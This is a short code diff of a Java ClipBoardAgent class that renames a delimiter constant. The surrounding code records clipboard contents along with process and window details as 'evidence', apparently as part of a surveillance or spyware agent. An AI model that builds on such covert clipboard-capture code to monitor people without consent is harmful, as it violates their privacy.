@@ -131,7 +131,7 @@ public final class ClipBoardAgent extends Agent implements UserAgent {
         items.addElement(process);
         items.addElement(window);
         items.addElement(payload);
-        items.addElement(Utils.intToByteArray(Evidence.EVIDENCE_DELIMITER));
+        items.addElement(Utils.intToByteArray(Evidence.E_DELIMITER));
 
         evidence.atomicWriteOnce(items);
 
